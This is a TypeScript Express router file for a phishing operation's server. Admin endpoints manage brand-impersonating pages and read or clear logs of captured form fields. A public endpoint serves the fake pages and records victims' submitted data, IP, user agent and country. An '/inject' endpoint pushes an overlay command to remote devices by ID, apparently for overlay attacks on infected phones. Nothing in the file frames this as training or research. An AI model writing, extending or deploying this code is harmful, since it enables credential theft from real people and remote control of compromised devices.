import { Router, type Request, type Response } from 'express';
import { db } from '../db';
import {
  ensurePhishingTables,
  getPhishingStats,
  listPhishingPages,
  listPhishingLogs,
  seedPhishingPages,
  setPhishingPageEnabled,
  removePhishingPage,
  clearPhishingLogs,
  getPhishingPageBySlug,
  getPhishingPageById,
  incrementPhishingHit,
  recordPhishingCapture,
  renderPhishingPage,
  type PhishingPageRow,
  type PhishingLogRow,
} from '../services/phishing';

/* ---------- optional socket relay for overlay injection ---------- */

let relay: ((deviceId: string, payload: Record<string, unknown>) => boolean) | null = null;

export function setPhishingRelay(fn: (deviceId: string, payload: Record<string, unknown>) => boolean): void {
  relay = fn;
}

/* ---------- helpers ---------- */

function clientIp(req: Request): string {
  const xff = req.headers['x-forwarded-for'];
  const first = Array.isArray(xff) ? xff[0] : xff;
  return (first ? first.split(',')[0].trim() : req.socket.remoteAddress ?? '');
}

function toPage(row: PhishingPageRow, req: Request) {
  const proto = (req.headers['x-forwarded-proto'] as string | undefined) ?? req.protocol;
  return {
    id: row.id,
    slug: row.slug,
    brand: row.brand,
    category: row.category,
    variant: row.variant,
    title: row.title,
    hits: row.hits,
    enabled: row.enabled,
    createdAt: row.created_at,
    url: `${proto}://${req.get('host')}/p/${row.slug}`,
  };
}

function toLog(row: PhishingLogRow) {
  let fields: Record<string, unknown> = {};
  let meta: Record<string, unknown> = {};
  try { fields = JSON.parse(row.fields); } catch { /* keep empty */ }
  try { meta = JSON.parse(row.meta); } catch { /* keep empty */ }
  return {
    id: row.id,
    pageId: row.page_id,
    slug: row.slug,
    brand: row.brand,
    variant: row.variant,
    ip: row.ip,
    userAgent: row.user_agent,
    fields,
    meta,
    country: row.country,
    city: row.city,
    createdAt: row.created_at,
  };
}

/* ---------- init ---------- */

export function initPhishing(): void {
  ensurePhishingTables(db);
}

/* ---------- admin router (mounted at /api/phishing) ---------- */

export const phishingRoutes: Router = Router();
initPhishing();

phishingRoutes.get('/stats', (_req: Request, res: Response) => {
  res.json({ success: true, data: getPhishingStats(db) });
});

phishingRoutes.get('/pages', (req: Request, res: Response) => {
  const page = Math.max(1, Number(req.query.page) || 1);
  const pageSize = Math.min(100, Math.max(1, Number(req.query.pageSize) || 20));
  const result = listPhishingPages(db, {
    page,
    pageSize,
    search: String(req.query.search ?? '').trim() || undefined,
    category: String(req.query.category ?? 'all'),
    enabled: String(req.query.enabled ?? 'all'),
  });
  res.json({ success: true, data: { pages: result.pages.map((p) => toPage(p, req)), total: result.total } });
});

phishingRoutes.get('/logs', (req: Request, res: Response) => {
  const page = Math.max(1, Number(req.query.page) || 1);
  const pageSize = Math.min(100, Math.max(1, Number(req.query.pageSize) || 20));
  const result = listPhishingLogs(db, {
    page,
    pageSize,
    search: String(req.query.search ?? '').trim() || undefined,
  });
  res.json({ success: true, data: { logs: result.logs.map(toLog), total: result.total } });
});

phishingRoutes.post('/seed', (_req: Request, res: Response) => {
  res.json({ success: true, data: seedPhishingPages(db) });
});

phishingRoutes.patch('/pages/:id', (req: Request, res: Response) => {
  const id = Number(req.params.id);
  const enabled = Number((req.body as { enabled?: unknown } | undefined)?.enabled);
  if (!setPhishingPageEnabled(db, id, enabled)) {
    return res.status(400).json({ success: false, error: 'invalid payload' });
  }
  res.json({ success: true });
});

phishingRoutes.post('/pages/:id/toggle', (req: Request, res: Response) => {
  const id = Number(req.params.id);
  const enabled = Number((req.body as { enabled?: unknown } | undefined)?.enabled);
  if (!setPhishingPageEnabled(db, id, enabled)) {
    return res.status(400).json({ success: false, error: 'invalid payload' });
  }
  res.json({ success: true });
});

phishingRoutes.delete('/pages/:id', (req: Request, res: Response) => {
  const id = Number(req.params.id);
  if (!removePhishingPage(db, id)) {
    return res.status(400).json({ success: false, error: 'invalid id' });
  }
  res.json({ success: true });
});

phishingRoutes.post('/logs/clear', (_req: Request, res: Response) => {
  clearPhishingLogs(db);
  res.json({ success: true });
});

phishingRoutes.post('/inject', (req: Request, res: Response) => {
  const { deviceId, slug } = (req.body ?? {}) as { deviceId?: string; slug?: string };
  if (!deviceId || !slug) {
    return res.status(400).json({ success: false, error: 'deviceId and slug are required' });
  }
  const page = getPhishingPageBySlug(db, slug);
  if (!page || page.enabled !== 1) {
    return res.status(404).json({ success: false, error: 'page not found or disabled' });
  }
  if (!relay) {
    return res.status(503).json({ success: false, error: 'command relay not configured' });
  }
  const delivered = relay(deviceId, {
    type: '0xOV',
    action: 'inject',
    url: `/p/${page.slug}/overlay`,
    slug: page.slug,
    brand: page.brand,
    variant: page.variant,
  });
  if (!delivered) {
    return res.json({ success: false, error: 'device offline' });
  }
  res.json({ success: true, data: { delivered: true } });
});

/* ---------- public router (mounted at / for /p/:slug pages) ---------- */

export function createPhishingPublicRouter(): Router {
  const r = Router();

  r.get('/p/:slug', (req: Request, res: Response) => {
    const row = getPhishingPageBySlug(db, req.params.slug);
    if (!row || row.enabled !== 1) return res.status(404).send('Not found');
    incrementPhishingHit(db, row.id);
    res.type('html').send(renderPhishingPage(row));
  });

  r.get('/p/:slug/overlay', (req: Request, res: Response) => {
    const row = getPhishingPageBySlug(db, req.params.slug);
    if (!row || row.enabled !== 1) return res.status(404).send('Not found');
    incrementPhishingHit(db, row.id);
    res.type('html').send(renderPhishingPage(row, { overlay: true }));
  });

  r.post('/p/:slug/capture', (req: Request, res: Response) => {
    const row = getPhishingPageBySlug(db, req.params.slug);
    if (!row) return res.status(404).json({ success: false, error: 'not found' });
    const body = (req.body ?? {}) as { fields?: Record<string, unknown>; meta?: Record<string, unknown> };
    recordPhishingCapture(db, row, {
      fields: body.fields ?? {},
      meta: { ...(body.meta ?? {}), ts: new Date().toISOString() },
      ip: clientIp(req),
      userAgent: String(req.headers['user-agent'] ?? ''),
      country: (req.headers['cf-ipcountry'] as string | undefined) ?? null,
      city: null,
    });
    res.json({ success: true });
  });

  return r;
  }
